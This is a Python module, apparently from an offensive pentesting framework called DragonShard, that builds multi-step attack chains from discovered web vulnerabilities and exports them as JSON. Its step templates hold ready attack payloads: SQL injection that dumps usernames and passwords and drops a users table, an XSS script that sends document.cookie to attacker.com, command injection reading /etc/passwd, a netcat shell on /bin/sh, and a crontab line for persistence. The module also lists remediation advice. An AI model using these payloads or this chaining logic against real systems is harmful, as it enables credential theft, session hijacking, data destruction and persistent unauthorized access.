#!/usr/bin/env python3
"""
DragonShard Chain Planner Module

Intelligent attack planning engine that integrates reconnaissance, crawling,
and fuzzing results to generate actionable attack strategies.
"""

import json
import logging
import time
from dataclasses import asdict, dataclass
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

import httpx

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of attacks that can be planned."""

    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LFI = "lfi"
    RFI = "rfi"
    XXE = "xxe"
    SSRF = "ssrf"
    TEMPLATE_INJECTION = "template_injection"
    NOSQL_INJECTION = "nosql_injection"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_EXFILTRATION = "data_exfiltration"
    REMOTE_CODE_EXECUTION = "remote_code_execution"


class AttackComplexity(Enum):
    """Complexity levels for attack chains."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class AttackImpact(Enum):
    """Impact levels for attack chains."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class Vulnerability:
    """Represents a discovered vulnerability."""

    target_url: str
    vulnerability_type: AttackType
    payload: str
    confidence: float
    evidence: str
    impact: AttackImpact
    complexity: AttackComplexity
    exploitability: float
    description: str
    remediation: str
    cve_references: List[str] = None
    timestamp: float = None

    def __post_init__(self):
        if self.cve_references is None:
            self.cve_references = []
        if self.timestamp is None:
            self.timestamp = time.time()


@dataclass
class AttackStep:
    """Represents a single step in an attack chain."""

    step_id: str
    step_name: str
    attack_type: AttackType
    target_url: str
    payload: str
    expected_outcome: str
    success_criteria: str
    dependencies: List[str] = None
    prerequisites: List[str] = None
    estimated_time: int = 0  # seconds
    risk_level: AttackComplexity = AttackComplexity.MEDIUM

    def __post_init__(self):
        if self.dependencies is None:
            self.dependencies = []
        if self.prerequisites is None:
            self.prerequisites = []


@dataclass
class AttackChain:
    """Represents a complete attack chain."""

    chain_id: str
    chain_name: str
    description: str
    target_host: str
    attack_steps: List[AttackStep]
    total_impact: AttackImpact
    total_complexity: AttackComplexity
    success_probability: float
    estimated_duration: int  # seconds
    prerequisites: List[str] = None
    post_exploitation: List[str] = None
    risk_assessment: str = ""
    mitigation_strategies: List[str] = None

    def __post_init__(self):
        if self.prerequisites is None:
            self.prerequisites = []
        if self.post_exploitation is None:
            self.post_exploitation = []
        if self.mitigation_strategies is None:
            self.mitigation_strategies = []


class ChainPlanner:
    """
    Intelligent attack planning engine that generates attack chains
    based on reconnaissance and fuzzing results.
    """

    def __init__(self, llm_api_key: Optional[str] = None, llm_base_url: Optional[str] = None):
        """
        Initialize the chain planner.

        Args:
            llm_api_key: API key for LLM service (optional)
            llm_base_url: Base URL for LLM service (optional)
        """
        self.llm_api_key = llm_api_key
        self.llm_base_url = llm_base_url or "https://api.openai.com/v1"
        self.client = httpx.Client(timeout=30.0)

        # Load attack strategies and templates
        self.attack_strategies = self._load_attack_strategies()
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.chain_templates = self._load_chain_templates()

        # Planning state
        self.discovered_vulnerabilities: List[Vulnerability] = []
        self.generated_chains: List[AttackChain] = []
        self.target_information: Dict[str, Any] = {}

        logger.info("ChainPlanner initialized successfully")

    def _load_attack_strategies(self) -> Dict[str, Any]:
        """Load predefined attack strategies."""
        strategies = {
            "sql_injection": {
                "name": "SQL Injection Chain",
                "steps": [
                    "reconnaissance",
                    "vulnerability_discovery",
                    "payload_injection",
                    "data_extraction",
                    "privilege_escalation",
                ],
                "complexity": AttackComplexity.MEDIUM,
                "impact": AttackImpact.HIGH,
            },
            "xss_chain": {
                "name": "Cross-Site Scripting Chain",
                "steps": [
                    "input_discovery",
                    "payload_testing",
                    "session_hijacking",
                    "data_exfiltration",
                ],
                "complexity": AttackComplexity.LOW,
                "impact": AttackImpact.MEDIUM,
            },
            "rce_chain": {
                "name": "Remote Code Execution Chain",
                "steps": [
                    "vulnerability_discovery",
                    "payload_development",
                    "code_injection",
                    "shell_establishment",
                    "persistence",
                ],
                "complexity": AttackComplexity.HIGH,
                "impact": AttackImpact.CRITICAL,
            },
            "authentication_bypass": {
                "name": "Authentication Bypass Chain",
                "steps": [
                    "endpoint_discovery",
                    "auth_mechanism_analysis",
                    "bypass_technique_selection",
                    "access_granted",
                ],
                "complexity": AttackComplexity.MEDIUM,
                "impact": AttackImpact.HIGH,
            },
        }
        return strategies

    def _load_vulnerability_patterns(self) -> Dict[str, Any]:
        """Load vulnerability detection patterns."""
        patterns = {
            AttackType.SQL_INJECTION: {
                "indicators": ["sql", "mysql", "postgresql", "oracle", "syntax error"],
                "payloads": ["' OR 1=1--", "'; DROP TABLE users--", "' UNION SELECT 1,2,3--"],
                "impact": AttackImpact.HIGH,
                "complexity": AttackComplexity.MEDIUM,
            },
            AttackType.XSS: {
                "indicators": ["alert", "script", "javascript", "onload", "onerror"],
                "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
                "impact": AttackImpact.MEDIUM,
                "complexity": AttackComplexity.LOW,
            },
            AttackType.COMMAND_INJECTION: {
                "indicators": ["root:", "uid=", "gid=", "drwx", "ls -la"],
                "payloads": ["; ls", "&& whoami", "| cat /etc/passwd"],
                "impact": AttackImpact.CRITICAL,
                "complexity": AttackComplexity.HIGH,
            },
            AttackType.PATH_TRAVERSAL: {
                "indicators": ["root:x:", "bin:x:", "daemon:x:", "/etc/passwd"],
                "payloads": ["../../../etc/passwd", "..\\..\\..\\windows\\system32"],
                "impact": AttackImpact.HIGH,
                "complexity": AttackComplexity.MEDIUM,
            },
        }
        return patterns

    def _load_chain_templates(self) -> Dict[str, Any]:
        """Load attack chain templates."""
        templates = {
            "web_application": {
                "name": "Web Application Attack Chain",
                "description": "Comprehensive web application penetration testing",
                "steps": [
                    "reconnaissance",
                    "vulnerability_discovery",
                    "exploitation",
                    "post_exploitation",
                ],
            },
            "api_attack": {
                "name": "API Attack Chain",
                "description": "API endpoint testing and exploitation",
                "steps": [
                    "endpoint_discovery",
                    "authentication_bypass",
                    "data_extraction",
                    "privilege_escalation",
                ],
            },
            "network_penetration": {
                "name": "Network Penetration Chain",
                "description": "Network-based attack chain",
                "steps": [
                    "network_scanning",
                    "service_enumeration",
                    "vulnerability_exploitation",
                    "lateral_movement",
                ],
            },
        }
        return templates

    def add_vulnerability(self, vulnerability: Vulnerability) -> None:
        """
        Add a discovered vulnerability to the planner.

        Args:
            vulnerability: The discovered vulnerability
        """
        self.discovered_vulnerabilities.append(vulnerability)
        logger.info(
            f"Added vulnerability: {vulnerability.vulnerability_type.value} on {vulnerability.target_url}"
        )

    def add_target_information(self, host: str, information: Dict[str, Any]) -> None:
        """
        Add target information from reconnaissance.

        Args:
            host: Target host
            information: Reconnaissance information
        """
        self.target_information[host] = information
        logger.info(f"Added target information for {host}")

    def analyze_vulnerabilities(self) -> Dict[str, Any]:
        """
        Analyze discovered vulnerabilities and generate insights.

        Returns:
            Analysis results with vulnerability statistics and patterns
        """
        if not self.discovered_vulnerabilities:
            return {"message": "No vulnerabilities to analyze"}

        analysis = {
            "total_vulnerabilities": len(self.discovered_vulnerabilities),
            "vulnerability_types": {},
            "impact_distribution": {},
            "complexity_distribution": {},
            "high_risk_targets": [],
            "attack_opportunities": [],
        }

        # Analyze vulnerability types
        for vuln in self.discovered_vulnerabilities:
            vuln_type = vuln.vulnerability_type.value
            analysis["vulnerability_types"][vuln_type] = (
                analysis["vulnerability_types"].get(vuln_type, 0) + 1
            )

            # Impact distribution
            impact = vuln.impact.value
            analysis["impact_distribution"][impact] = (
                analysis["impact_distribution"].get(impact, 0) + 1
            )

            # Complexity distribution
            complexity = vuln.complexity.value
            analysis["complexity_distribution"][complexity] = (
                analysis["complexity_distribution"].get(complexity, 0) + 1
            )

            # High risk targets
            if vuln.impact in [AttackImpact.HIGH, AttackImpact.CRITICAL]:
                analysis["high_risk_targets"].append(
                    {
                        "url": vuln.target_url,
                        "type": vuln.vulnerability_type.value,
                        "impact": vuln.impact.value,
                        "confidence": vuln.confidence,
                    }
                )

        # Identify attack opportunities
        analysis["attack_opportunities"] = self._identify_attack_opportunities()

        return analysis

    def _identify_attack_opportunities(self) -> List[Dict[str, Any]]:
        """Identify potential attack opportunities based on vulnerabilities."""
        opportunities = []

        # Group vulnerabilities by target
        target_vulns = {}
        for vuln in self.discovered_vulnerabilities:
            target = vuln.target_url
            if target not in target_vulns:
                target_vulns[target] = []
            target_vulns[target].append(vuln)

        # Analyze each target for attack opportunities
        for target, vulns in target_vulns.items():
            opportunity = {
                "target": target,
                "vulnerability_count": len(vulns),
                "high_impact_vulns": [
                    v for v in vulns if v.impact in [AttackImpact.HIGH, AttackImpact.CRITICAL]
                ],
                "attack_chains": self._identify_chain_opportunities(vulns),
                "risk_score": self._calculate_risk_score(vulns),
            }
            opportunities.append(opportunity)

        return opportunities

    def _identify_chain_opportunities(self, vulnerabilities: List[Vulnerability]) -> List[str]:
        """Identify potential attack chains based on vulnerabilities."""
        chains = []

        # Check for SQL injection chains
        sql_vulns = [v for v in vulnerabilities if v.vulnerability_type == AttackType.SQL_INJECTION]
        if sql_vulns:
            chains.append("sql_injection_chain")

        # Check for XSS chains
        xss_vulns = [v for v in vulnerabilities if v.vulnerability_type == AttackType.XSS]
        if xss_vulns:
            chains.append("xss_chain")

        # Check for RCE chains
        rce_vulns = [
            v for v in vulnerabilities if v.vulnerability_type == AttackType.COMMAND_INJECTION
        ]
        if rce_vulns:
            chains.append("rce_chain")

        # Check for authentication bypass opportunities
        auth_vulns = [
            v for v in vulnerabilities if v.vulnerability_type == AttackType.AUTHENTICATION_BYPASS
        ]
        if auth_vulns:
            chains.append("authentication_bypass_chain")

        return chains

    def _calculate_risk_score(self, vulnerabilities: List[Vulnerability]) -> float:
        """Calculate risk score for a set of vulnerabilities."""
        if not vulnerabilities:
            return 0.0

        total_score = 0.0
        for vuln in vulnerabilities:
            # Base score from impact and complexity
            impact_score = {"low": 1, "medium": 2, "high": 3, "critical": 4}[vuln.impact.value]
            complexity_score = {"low": 1, "medium": 2, "high": 3, "critical": 4}[
                vuln.complexity.value
            ]

            # Factor in confidence and exploitability
            score = (impact_score + complexity_score) * vuln.confidence * vuln.exploitability
            total_score += score

        return min(total_score / len(vulnerabilities), 10.0)  # Normalize to 0-10 scale

    def generate_attack_chains(self, target_host: str = None) -> List[AttackChain]:
        """
        Generate attack chains based on discovered vulnerabilities.

        Args:
            target_host: Specific target host (optional)

        Returns:
            List of generated attack chains
        """
        if not self.discovered_vulnerabilities:
            logger.warning("No vulnerabilities available for attack chain generation")
            return []

        # Filter vulnerabilities by target if specified
        target_vulns = self.discovered_vulnerabilities
        if target_host:
            target_vulns = [
                v for v in self.discovered_vulnerabilities if target_host in v.target_url
            ]

        if not target_vulns:
            logger.warning(f"No vulnerabilities found for target: {target_host}")
            return []

        chains = []

        # Generate SQL injection chains
        sql_chains = self._generate_sql_injection_chains(target_vulns)
        chains.extend(sql_chains)

        # Generate XSS chains
        xss_chains = self._generate_xss_chains(target_vulns)
        chains.extend(xss_chains)

        # Generate RCE chains
        rce_chains = self._generate_rce_chains(target_vulns)
        chains.extend(rce_chains)

        # Generate authentication bypass chains
        auth_chains = self._generate_auth_bypass_chains(target_vulns)
        chains.extend(auth_chains)

        # Sort chains by success probability and impact
        chains.sort(key=lambda x: (x.success_probability, x.total_impact.value), reverse=True)

        self.generated_chains.extend(chains)
        logger.info(f"Generated {len(chains)} attack chains")

        return chains

    def _generate_sql_injection_chains(
        self, vulnerabilities: List[Vulnerability]
    ) -> List[AttackChain]:
        """Generate SQL injection attack chains."""
        sql_vulns = [v for v in vulnerabilities if v.vulnerability_type == AttackType.SQL_INJECTION]
        if not sql_vulns:
            return []

        chains = []
        for vuln in sql_vulns:
            steps = [
                AttackStep(
                    step_id="recon",
                    step_name="Reconnaissance",
                    attack_type=AttackType.SQL_INJECTION,
                    target_url=vuln.target_url,
                    payload="",
                    expected_outcome="Identify vulnerable endpoints",
                    success_criteria="Endpoint discovered",
                    estimated_time=30,
                ),
                AttackStep(
                    step_id="discovery",
                    step_name="Vulnerability Discovery",
                    attack_type=AttackType.SQL_INJECTION,
                    target_url=vuln.target_url,
                    payload=vuln.payload,
                    expected_outcome="Confirm SQL injection vulnerability",
                    success_criteria="SQL error or unexpected response",
                    dependencies=["recon"],
                    estimated_time=60,
                ),
                AttackStep(
                    step_id="extraction",
                    step_name="Data Extraction",
                    attack_type=AttackType.SQL_INJECTION,
                    target_url=vuln.target_url,
                    payload="' UNION SELECT username,password FROM users--",
                    expected_outcome="Extract sensitive data",
                    success_criteria="Database data retrieved",
                    dependencies=["discovery"],
                    estimated_time=120,
                ),
                AttackStep(
                    step_id="escalation",
                    step_name="Privilege Escalation",
                    attack_type=AttackType.SQL_INJECTION,
                    target_url=vuln.target_url,
                    payload="'; DROP TABLE users--",
                    expected_outcome="Gain elevated privileges",
                    success_criteria="Database structure modified",
                    dependencies=["extraction"],
                    estimated_time=180,
                ),
            ]

            chain = AttackChain(
                chain_id=f"sql_chain_{len(chains)}",
                chain_name=f"SQL Injection Chain - {vuln.target_url}",
                description="Comprehensive SQL injection attack chain",
                target_host=vuln.target_url,
                attack_steps=steps,
                total_impact=AttackImpact.HIGH,
                total_complexity=AttackComplexity.MEDIUM,
                success_probability=vuln.confidence,
                estimated_duration=sum(step.estimated_time for step in steps),
                risk_assessment="High risk - potential data breach and system compromise",
            )
            chains.append(chain)

        return chains

    def _generate_xss_chains(self, vulnerabilities: List[Vulnerability]) -> List[AttackChain]:
        """Generate XSS attack chains."""
        xss_vulns = [v for v in vulnerabilities if v.vulnerability_type == AttackType.XSS]
        if not xss_vulns:
            return []

        chains = []
        for vuln in xss_vulns:
            steps = [
                AttackStep(
                    step_id="input_discovery",
                    step_name="Input Discovery",
                    attack_type=AttackType.XSS,
                    target_url=vuln.target_url,
                    payload="",
                    expected_outcome="Identify user input points",
                    success_criteria="Input fields identified",
                    estimated_time=30,
                ),
                AttackStep(
                    step_id="payload_testing",
                    step_name="Payload Testing",
                    attack_type=AttackType.XSS,
                    target_url=vuln.target_url,
                    payload=vuln.payload,
                    expected_outcome="Confirm XSS vulnerability",
                    success_criteria="JavaScript execution confirmed",
                    dependencies=["input_discovery"],
                    estimated_time=60,
                ),
                AttackStep(
                    step_id="session_hijacking",
                    step_name="Session Hijacking",
                    attack_type=AttackType.XSS,
                    target_url=vuln.target_url,
                    payload="<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                    expected_outcome="Steal user sessions",
                    success_criteria="Session data exfiltrated",
                    dependencies=["payload_testing"],
                    estimated_time=90,
                ),
            ]

            chain = AttackChain(
                chain_id=f"xss_chain_{len(chains)}",
                chain_name=f"XSS Chain - {vuln.target_url}",
                description="Cross-site scripting attack chain",
                target_host=vuln.target_url,
                attack_steps=steps,
                total_impact=AttackImpact.MEDIUM,
                total_complexity=AttackComplexity.LOW,
                success_probability=vuln.confidence,
                estimated_duration=sum(step.estimated_time for step in steps),
                risk_assessment="Medium risk - potential session hijacking and data theft",
            )
            chains.append(chain)

        return chains

    def _generate_rce_chains(self, vulnerabilities: List[Vulnerability]) -> List[AttackChain]:
        """Generate Remote Code Execution attack chains."""
        rce_vulns = [
            v for v in vulnerabilities if v.vulnerability_type == AttackType.COMMAND_INJECTION
        ]
        if not rce_vulns:
            return []

        chains = []
        for vuln in rce_vulns:
            steps = [
                AttackStep(
                    step_id="vuln_discovery",
                    step_name="Vulnerability Discovery",
                    attack_type=AttackType.COMMAND_INJECTION,
                    target_url=vuln.target_url,
                    payload=vuln.payload,
                    expected_outcome="Confirm command injection vulnerability",
                    success_criteria="Command execution confirmed",
                    estimated_time=60,
                ),
                AttackStep(
                    step_id="shell_establishment",
                    step_name="Shell Establishment",
                    attack_type=AttackType.COMMAND_INJECTION,
                    target_url=vuln.target_url,
                    payload="; nc -l 4444 -e /bin/sh",
                    expected_outcome="Establish reverse shell",
                    success_criteria="Reverse shell connection established",
                    dependencies=["vuln_discovery"],
                    estimated_time=120,
                ),
                AttackStep(
                    step_id="persistence",
                    step_name="Persistence",
                    attack_type=AttackType.COMMAND_INJECTION,
                    target_url=vuln.target_url,
                    payload="; echo '*/5 * * * * nc -l 4444 -e /bin/sh' >> /etc/crontab",
                    expected_outcome="Establish persistent access",
                    success_criteria="Persistence mechanism installed",
                    dependencies=["shell_establishment"],
                    estimated_time=180,
                ),
            ]

            chain = AttackChain(
                chain_id=f"rce_chain_{len(chains)}",
                chain_name=f"RCE Chain - {vuln.target_url}",
                description="Remote Code Execution attack chain",
                target_host=vuln.target_url,
                attack_steps=steps,
                total_impact=AttackImpact.CRITICAL,
                total_complexity=AttackComplexity.HIGH,
                success_probability=vuln.confidence,
                estimated_duration=sum(step.estimated_time for step in steps),
                risk_assessment="Critical risk - complete system compromise",
            )
            chains.append(chain)

        return chains

    def _generate_auth_bypass_chains(
        self, vulnerabilities: List[Vulnerability]
    ) -> List[AttackChain]:
        """Generate authentication bypass attack chains."""
        auth_vulns = [
            v for v in vulnerabilities if v.vulnerability_type == AttackType.AUTHENTICATION_BYPASS
        ]
        if not auth_vulns:
            return []

        chains = []
        for vuln in auth_vulns:
            steps = [
                AttackStep(
                    step_id="endpoint_discovery",
                    step_name="Endpoint Discovery",
                    attack_type=AttackType.AUTHENTICATION_BYPASS,
                    target_url=vuln.target_url,
                    payload="",
                    expected_outcome="Identify authentication endpoints",
                    success_criteria="Login endpoints identified",
                    estimated_time=30,
                ),
                AttackStep(
                    step_id="bypass_attempt",
                    step_name="Bypass Attempt",
                    attack_type=AttackType.AUTHENTICATION_BYPASS,
                    target_url=vuln.target_url,
                    payload=vuln.payload,
                    expected_outcome="Bypass authentication mechanism",
                    success_criteria="Access granted without credentials",
                    dependencies=["endpoint_discovery"],
                    estimated_time=90,
                ),
            ]

            chain = AttackChain(
                chain_id=f"auth_chain_{len(chains)}",
                chain_name=f"Auth Bypass Chain - {vuln.target_url}",
                description="Authentication bypass attack chain",
                target_host=vuln.target_url,
                attack_steps=steps,
                total_impact=AttackImpact.HIGH,
                total_complexity=AttackComplexity.MEDIUM,
                success_probability=vuln.confidence,
                estimated_duration=sum(step.estimated_time for step in steps),
                risk_assessment="High risk - unauthorized access to protected resources",
            )
            chains.append(chain)

        return chains

    def get_attack_chains(self, target_host: str = None) -> List[AttackChain]:
        """
        Get generated attack chains.

        Args:
            target_host: Filter by target host (optional)

        Returns:
            List of attack chains
        """
        if target_host:
            return [chain for chain in self.generated_chains if target_host in chain.target_host]
        return self.generated_chains

    def export_chains(self, filename: str, format: str = "json") -> None:
        """
        Export attack chains to a file.

        Args:
            filename: Output filename
            format: Export format (json, csv)
        """
        if format == "json":
            # Convert enum values to strings for JSON serialization
            def convert_enum(obj):
                if isinstance(obj, (AttackType, AttackComplexity, AttackImpact)):
                    return obj.value
                return obj

            def convert_chain(chain):
                chain_dict = asdict(chain)
                # Convert enum values in attack steps
                for step in chain_dict.get("attack_steps", []):
                    if "attack_type" in step:
                        step["attack_type"] = step["attack_type"].value
                    if "risk_level" in step:
                        step["risk_level"] = step["risk_level"].value
                # Convert enum values in chain
                chain_dict["total_impact"] = chain_dict["total_impact"].value
                chain_dict["total_complexity"] = chain_dict["total_complexity"].value
                return chain_dict

            data = {
                "generated_at": time.time(),
                "total_chains": len(self.generated_chains),
                "chains": [convert_chain(chain) for chain in self.generated_chains],
            }
            with open(filename, "w") as f:
                json.dump(data, f, indent=2)
        else:
            raise ValueError(f"Unsupported format: {format}")

        logger.info(f"Exported {len(self.generated_chains)} attack chains to {filename}")

    def get_planning_summary(self) -> Dict[str, Any]:
        """
        Get a summary of the planning results.

        Returns:
            Planning summary with statistics and recommendations
        """
        summary = {
            "total_vulnerabilities": len(self.discovered_vulnerabilities),
            "total_chains": len(self.generated_chains),
            "targets_analyzed": len(set(v.target_url for v in self.discovered_vulnerabilities)),
            "high_risk_chains": len(
                [
                    c
                    for c in self.generated_chains
                    if c.total_impact in [AttackImpact.HIGH, AttackImpact.CRITICAL]
                ]
            ),
            "average_success_probability": sum(c.success_probability for c in self.generated_chains)
            / len(self.generated_chains)
            if self.generated_chains
            else 0,
            "recommendations": self._generate_recommendations(),
        }
        return summary

    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations based on discovered vulnerabilities."""
        recommendations = []

        # Count vulnerability types
        vuln_counts = {}
        for vuln in self.discovered_vulnerabilities:
            vuln_type = vuln.vulnerability_type.value
            vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + 1

        # Generate recommendations based on findings
        if vuln_counts.get("sql_injection", 0) > 0:
            recommendations.append(
                "Implement input validation and parameterized queries to prevent SQL injection"
            )

        if vuln_counts.get("xss", 0) > 0:
            recommendations.append(
                "Implement output encoding and Content Security Policy to prevent XSS"
            )

        if vuln_counts.get("command_injection", 0) > 0:
            recommendations.append(
                "Avoid command execution and implement proper input sanitization"
            )

        if vuln_counts.get("path_traversal", 0) > 0:
            recommendations.append("Implement proper path validation and use whitelist approach")

        if len(self.discovered_vulnerabilities) > 5:
            recommendations.append("Conduct comprehensive security audit and penetration testing")

        return recommendations


if __name__ == "__main__":
    # Example usage
    import logging

    logging.basicConfig(level=logging.INFO)

    # Initialize planner
    planner = ChainPlanner()

    # Add sample vulnerabilities
    sample_vulns = [
        Vulnerability(
            target_url="http://example.com/search.php",
            vulnerability_type=AttackType.SQL_INJECTION,
            payload="' OR 1=1--",
            confidence=0.9,
            evidence="SQL syntax error in response",
            impact=AttackImpact.HIGH,
            complexity=AttackComplexity.MEDIUM,
            exploitability=0.8,
            description="SQL injection vulnerability in search parameter",
            remediation="Use parameterized queries",
        ),
        Vulnerability(
            target_url="http://example.com/comment.php",
            vulnerability_type=AttackType.XSS,
            payload="<script>alert('XSS')</script>",
            confidence=0.7,
            evidence="JavaScript executed in response",
            impact=AttackImpact.MEDIUM,
            complexity=AttackComplexity.LOW,
            exploitability=0.6,
            description="Reflected XSS vulnerability",
            remediation="Implement output encoding",
        ),
    ]

    for vuln in sample_vulns:
        planner.add_vulnerability(vuln)

    # Generate attack chains
    chains = planner.generate_attack_chains()

    print(f"Generated {len(chains)} attack chains")
    for chain in chains:
        print(f"- {chain.chain_name} (Success: {chain.success_probability:.2f})")

    # Export results
    planner.export_chains("attack_chains.json")
